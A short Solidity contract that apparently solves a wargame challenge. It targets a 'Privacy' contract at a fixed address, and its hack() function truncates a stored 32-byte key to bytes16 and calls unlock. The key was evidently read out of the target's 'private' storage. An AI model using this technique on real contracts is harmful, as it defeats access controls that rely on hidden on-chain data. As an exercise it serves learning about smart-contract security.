//SPDX-License-Identifier: None
pragma solidity ^0.8.0;

interface Privacy {
    function unlock(bytes16 _key) external;
}

contract Key {
    Privacy privacy = Privacy(0x161BDa83E20203505546a8d6EDa910d5cdc3aaf4);
    bytes32 key = 0x5a22993b7dc5779c75164885ee41ef389460244ee855cc9e22e8177b837cd547;

    function hack() public {
        bytes16 key16 = bytes16(key);
        privacy.unlock(key16);
    }
}